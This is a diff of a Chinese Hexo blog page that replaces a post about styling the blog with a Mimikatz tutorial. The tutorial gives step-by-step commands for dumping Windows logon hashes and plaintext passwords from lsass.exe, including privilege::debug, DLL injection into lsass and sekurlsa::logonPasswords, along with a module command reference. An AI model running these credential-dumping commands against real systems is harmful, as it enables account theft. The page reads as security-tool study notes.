@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   
-  <title>Blog美化 | Mr.EliLen</title>
+  <title>Mimikatz | Mr.EliLen</title>
   
   <meta name="keywords" content="Web python php">
   
@@ -242,7 +242,7 @@
     
       
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
-  <div class="aplayer" data-theme data-mini="true" data-autoplay="true" data-mode="circulation" data-server="netease" data-type="song" data-id="139774" data-volume="0.7">
+  <div class="aplayer" data-theme data-mini="true" data-mode="circulation" data-server="netease" data-type="song" data-id="139774" data-volume="0.7">
   </div>
   <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
@@ -255,8 +255,8 @@
         
   
     <h1 class="title">
-      <a href="/2019/04/26/Blog/">
-        Blog美化
+      <a href="/2019/05/15/mimikatz/">
+        Mimikatz
       </a>
     </h1>
   
@@ -285,7 +285,7 @@
             <div class="new-meta-item date">
   <a class="notlink">
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2019-04-26</p>
+    <p>2019-05-15</p>
   </a>
 </div>
 
@@ -295,9 +295,9 @@
             
   
   <div class="new-meta-item category">
-    <a href="/categories/Life/daily/" rel="nofollow">
+    <a href="/categories/Study/Tools/" rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>Life&nbsp;/&nbsp;daily</p>
+      <p>Study&nbsp;/&nbsp;Tools</p>
     </a>
   </div>
 
@@ -337,9 +337,87 @@
 
       <section class="article typo">
         <div class="article-entry" itemprop="articleBody">
-          <p><font size="4">踏上美化博客的不归路<font><br><a id="more"></a></font></font></p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>从想搭博客开始，已经过了将近一个月了，直到今天晚上才完成，真的是好心累啊。<br>各种崩盘各种难受，可能是我前端学的太菜了吧，我用了整整六天的时间，来完成这么一个大工程，最开始只是想好好的玩一下，结果。。。。。。。。哎，一言难尽啊，总结两点，第一不要想优化博客，第二请查看第一条。 ….手动哭….</p>
-<h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2>
+          <font size="4">windows密码抓取神器</font>
+
+<a id="more"></a>
+<h4 id="win密码抓取"><a href="#win密码抓取" class="headerlink" title="win密码抓取"></a>win密码抓取</h4><p><strong>方法一：</strong></p>
+<ol>
+<li><p>运行主程序：<em>mimikatz.exe</em></p>
+</li>
+<li><p>输入：<em>privilege::debug</em>      提升权限</p>
+</li>
+<li><p>输入：inject::process lsass.exe sekurlsa.dll    将sekurlsa.dll 注入到lsass.exe 中（运行到这一步会出现拒绝访问的提示）</p>
+</li>
+<li><p>输入：<em>@getLogonPasswords</em>    即可获取<em>hash</em>和当前用户的明文密码！</p>
+</li>
+</ol>
+<p>原理就是登陆的时候输入的密码，经过 <em>lsass.exe</em> 里的<em>wdigest</em>和<em>tspkg</em>两个模块调用后，它们对之进行加密处理，而没有进行擦除，而且该加密通过特征可以定位，并且按照微软的算法可逆。 只要登陆过，就可以抓出来，它进行枚举的。简单地说，在 <em>Windows</em> 中，当用户登录时，<em>lsass.exe</em> 使用一个可逆的算法，加密过的明文密码，并且把密文保存在内存中，没有清理，然后可以抓出来，还原。 也就是说，开机以后，只要是登陆过的用户，在没重启前（因为重启内存就清零了，这里不包括使用其他方法清理内存），都可以抓出来，注销也是无用的</p>
+<p><strong>方法二（直接调用</strong>sekurlsa模块）</p>
+<ol>
+<li><p>运行主程序：mimikatz.exe</p>
+</li>
+<li><p>输入：privilege::debug      提升权限</p>
+</li>
+<li>输入：sekurlsa::logonPasswords full</li>
+</ol>
+<h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a><strong>工具使用</strong></h4><p><strong>cmd执行    mimikatz</strong></p>
+<ol>
+<li><p>常规的操作使用命令</p>
+<p>mimikatz # cls –&gt;清屏,类似<a href="https://www.2cto.com/os/dos/" target="_blank" rel="noopener">dos</a>命令cls.</p>
+<p>mimikatz # exit –&gt;退出mimikatz.</p>
+<p>mimikatz #version –&gt;查看当前的mimikatz的版本.</p>
+<p>随便输入”xxx::”，会提示error,可看到所有模块。</p>
+</li>
+</ol>
+<p><img src="/img/5/15/clipboard.png" alt="img"></p>
+<p>查看列表中模块的具体参数同样可以输入”模块::”来查看，比如:”inject::”,如图：</p>
+<p>可以看到模块inject的具体参数有pid,process,service等……</p>
+<p><img src="/img/5/15/clipboard1.png" alt="img"></p>
+<ol start="2">
+<li><p>系统方面的操作使用命令:system</p>
+<p>mimikatz #system::user –&gt;查看当前登录的系统用户</p>
+<p>mimikazt #system::computer –&gt;返回当前的计算机名称</p>
+</li>
+<li><p>在服务器终端的操作命令: ts</p>
+<p>ts::sessions –&gt;显示当前的会话</p>
+<p>ts::processes –&gt;显示服务器的进程和对应的pid情况等。</p>
+</li>
+<li><p>系统服务相关的操作使用命令:service</p>
+<p><em>service::list</em>    –&gt;列出系统的服务</p>
+<p><em>service::remove</em>    –&gt;移除系统的服务</p>
+<p><em>service::start stop</em> 服务名称    –&gt;启动或停止服务</p>
+</li>
+<li><p>系统进程相关操作的使用命令:process</p>
+<p><em>process::list</em>    –&gt;列出进程</p>
+<p><em>process::suspend</em> 进程名称    –&gt;暂停进程</p>
+<p><em>process::stop</em> 进程名称    –&gt;结束进程</p>
+<p><em>process::modules</em>    –&gt;列出系统的核心模块及所在位置</p>
+</li>
+<li><p>系统权限相关操作使用命令:<em>privilege</em></p>
+<p><em>privilege::list</em>    –&gt;列出权限列表</p>
+<p><em>privilege::enable</em>    –&gt;激活一个或多个权限</p>
+<p><em>privilege::debug</em>    –&gt;提升权限</p>
+</li>
+<li><p>打开系统文件：<em>nogpo</em></p>
+<p><em>nogpo::cmd</em>    –&gt;打开系统的<em>cmd.exe</em></p>
+<p><em>nogpo::regedit</em>    –&gt;打开系统的注册表</p>
+<p><em>nogpo::taskmgr</em>    –&gt;打开任务管理器</p>
+</li>
+<li><p>获取系统用户信息：sekurlsa</p>
+<p><em>sekurlsa::wdigest</em>    –&gt;获取本地用户信息及密码（win2008后无用）</p>
+<p><em>sekurlsa::tspkg</em>   –&gt;获取<em>tspkg</em>用户信息及密码</p>
+<p><em>sekurlsa::logonPasswords</em>   –&gt;获登陆用户信息及密码</p>
+</li>
+<li><p>系统线程相关操作使用命令:thread</p>
+</li>
+<li><p>系统句柄相关操作使用命令:handle</p>
+</li>
+<li><p>加密相关操作使用命令:crypto</p>
+</li>
+<li><p>注入操作使用命令:inject</p>
+</li>
+</ol>
+
         </div>
         
           
@@ -350,7 +428,7 @@
     <div class="new-meta-box">
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-06-17T22:29:09+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-06-17T22:25:51+08:00">
   <a class="notlink">
     <i class="fas fa-clock" aria-hidden="true"></i>
     <p>最后更新于 2019年6月17日</p>
@@ -362,7 +440,7 @@
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/hexo/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>hexo</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/随笔/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>随笔</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/tools/" rel="nofollow"><i class="fas fa-hashtag" aria-hidden="true"></i>&nbsp;<p>tools</p></a></div>
 
 
         
@@ -373,7 +451,7 @@
   <div class="-mob-share-list share-body">
     
       
-        <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Elilen.github.io/2019/04/26/Blog/&title=Blog美化 | Mr.EliLen&pics=/img/TX.jpg&summary=踏上美化博客的不归路">
+        <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Elilen.github.io/2019/05/15/mimikatz/&title=Mimikatz | Mr.EliLen&pics=/img/TX.jpg&summary=windows密码抓取神器">
           
             <img src="/img/qq.png">
           
@@ -381,7 +459,7 @@
       
     
       
-        <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Elilen.github.io/2019/04/26/Blog/&title=Blog美化 | Mr.EliLen&pics=/img/TX.jpg&summary=踏上美化博客的不归路">
+        <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://Elilen.github.io/2019/05/15/mimikatz/&title=Mimikatz | Mr.EliLen&pics=/img/TX.jpg&summary=windows密码抓取神器">
           
             <img src="/img/qzone.png">
           
@@ -389,7 +467,7 @@
       
     
       
-        <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=https://Elilen.github.io/2019/04/26/Blog/&title=Blog美化 | Mr.EliLen&pics=/img/TX.jpg&summary=踏上美化博客的不归路">
+        <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer" href="http://service.weibo.com/share/share.php?url=https://Elilen.github.io/2019/05/15/mimikatz/&title=Mimikatz | Mr.EliLen&pics=/img/TX.jpg&summary=windows密码抓取神器">
           
             <img src="/img/weibo.png">
           
@@ -411,40 +489,21 @@
         
             <div class="prev-next">
                 
-                    <section class="prev">
-                        <span class="art-item-left">
-                            <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
-                            <h4>
-                                <a href="/2019/04/26/py-encode/" rel="prev" title="Python编码">
-                                  
-                                      Python编码
-                                  
-                                </a>
-                            </h4>
-                            
-                                
-                                <h6 class="tags">
-                                    <a class="tag" href="/tags/python编码/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>python编码</a>
-                                </h6>
-                            
-                        </span>
-                    </section>
-                
                 
                     <section class="next">
                         <span class="art-item-right" aria-hidden="true">
                             <h6>下一页&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i></h6>
                             <h4>
-                                <a href="/2019/04/25/img/" rel="prev" title="随笔图">
+                                <a href="/2019/04/29/Nmap/" rel="prev" title="Namp使用">
                                     
-                                        随笔图
+                                        Namp使用
                                     
                                 </a>
                             </h4>
                             
                                 
                                 <h6 class="tags">
-                                    <a class="tag" href="/tags/img/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>img</a>
+                                    <a class="tag" href="/tags/namp/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>namp</a> <a class="tag" href="/tags/kali/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>kali</a> <a class="tag" href="/tags/tools/"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>tools</a>
                                 </h6>
                             
                         </span>
@@ -487,7 +546,7 @@
 
   <script>
     window.subData = {
-      title: 'Blog美化',
+      title: 'Mimikatz',
       tools: true
     }
   </script>
@@ -617,7 +676,7 @@
 </header>
 
     <div class="content pure">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#开始"><span class="toc-text">开始</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结束"><span class="toc-text">结束</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#win密码抓取"><span class="toc-text">win密码抓取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#工具使用"><span class="toc-text">工具使用</span></a></li></ol>
     </div>
   </section>
 
@@ -692,6 +751,28 @@
           
             
 
+
+  <section class="widget music">
+    
+<header class="pure">
+  <div><i class="fas fa-compact-disc fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;最近在听</div>
+  
+    <a class="rightBtn" rel="external nofollow noopener noreferrer" target="_blank" href="https://music.163.com/#/user/home?id=1801431547" title="https://music.163.com/#/user/home?id=1801431547">
+    <i class="far fa-heart fa-fw"></i></a>
+  
+</header>
+
+    <div class="content pure">
+      
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css">
+  <div class="aplayer" data-theme="#1BCDFC" data-mode="circulation" data-server="netease" data-type="playlist" data-id="2719810283" data-volume="0.7">
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"></script>
+
+
+    </div>
+  </section>
 
 
           
